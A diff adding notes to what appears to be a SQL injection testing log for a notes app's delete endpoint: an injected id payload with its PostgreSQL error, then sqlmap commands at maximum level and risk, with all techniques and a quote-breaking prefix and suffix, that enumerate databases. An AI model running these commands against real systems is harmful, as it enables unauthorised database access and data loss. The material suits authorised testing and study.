@@ -64,3 +64,21 @@ error i am receiving
 ```bash
 {"status": "error", "message":"An error occurred. StatementCallback; bad SQL grammar [DELETE FROM notes WHERE id = '--b079a6c0-fcd2-43b1-8feb-2147fac1eb0e'''-SELECT current_user';]; nested exception is org.postgresql.util.PSQLException: Unterminated string literal started at position 91 in SQL DELETE FROM notes WHERE id = '--b079a6c0-fcd2-43b1-8feb-2147fac1eb0e'''-SELECT current_user';. Expected  char"}
 ```
+
+
+1.
+sqlmap -r delete.req -p id --batch --level=5 --risk=3 --technique=BEUSTQ --dbs
+
+-r delete.req: Load raw request
+
+-p id: Target the id field
+
+--level=5 --risk=3: High-depth testing
+
+--technique=BEUSTQ: Use all SQLi types (Boolean, Error, Union, Stacked, Time-based, Inline queries)
+
+--dbs: Extract DB names
+
+
+2.sqlmap -r delete.req -p id --prefix="'" --suffix="--" --dbs
+--prefix and --suffix help when the backend wraps the id in single quotes.
